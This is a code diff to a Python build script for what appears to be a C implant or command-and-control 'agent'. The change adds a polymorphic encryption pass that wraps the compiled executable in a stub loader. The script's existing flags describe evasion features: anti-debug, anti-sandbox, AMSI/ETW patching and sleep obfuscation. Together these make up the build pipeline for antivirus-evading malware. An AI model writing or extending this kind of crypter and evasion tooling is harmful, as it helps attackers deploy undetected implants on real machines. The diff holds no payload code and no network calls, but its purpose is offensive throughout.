@@ -201,6 +201,7 @@ def build_agent(
     profile_path: Path = None,
     no_evasion: bool = False,
     debug: bool = False,
+    no_crypt: bool = False,
 ) -> Path:
     """
     Build a configured C agent.
@@ -394,6 +395,33 @@ END
 
     shutil.rmtree(build_dir, ignore_errors=True)
 
+    # ─── Pass 2: Polymorphic encryption (wrap in stub loader) ───
+    if not no_crypt:
+        # pe_crypt.py lives in scripts/ alongside this file
+        _scripts_dir = str(Path(__file__).parent)
+        if _scripts_dir not in sys.path:
+            sys.path.insert(0, _scripts_dir)
+        from pe_crypt import crypt_pe
+
+        stub_dir = project_root / "agent_c" / "stub"
+        if not (stub_dir / "stub_loader.c").exists():
+            print("[!] Stub loader not found, skipping crypter pass")
+        else:
+            # Rename raw agent → payload, crypt into final output
+            payload_path = output_path.with_suffix(".payload.exe")
+            output_path.rename(payload_path)
+            try:
+                crypt_pe(
+                    input_pe=payload_path,
+                    output_exe=output_path,
+                    stub_dir=stub_dir,
+                    arch=arch,
+                )
+            finally:
+                # Always clean up the raw payload
+                if payload_path.exists():
+                    payload_path.unlink()
+
     return output_path
 
 
@@ -410,8 +438,10 @@ def parse_args():
     p.add_argument("--output", type=Path, default=None)
     p.add_argument("--no-evasion", action="store_true",
                    help="Disable all evasion (anti-debug, anti-sandbox, AMSI/ETW patches, sleep obf)")
+    p.add_argument("--no-crypt", action="store_true",
+                   help="Skip polymorphic encryption (output raw agent, useful for debugging)")
     p.add_argument("--debug", action="store_true",
-                   help="Enable debug logging to C:\\agent_debug.log")
+                   help="Enable debug logging to %%TEMP%%\\agent_debug.log")
     return p.parse_args()
 
 
@@ -441,6 +471,7 @@ def main():
             profile_path=args.profile,
             no_evasion=args.no_evasion,
             debug=args.debug,
+            no_crypt=args.no_crypt,
         )
         size_kb = exe_path.stat().st_size / 1024
         print(f"[+] Agent built: {exe_path} ({size_kb:.1f} KB)")
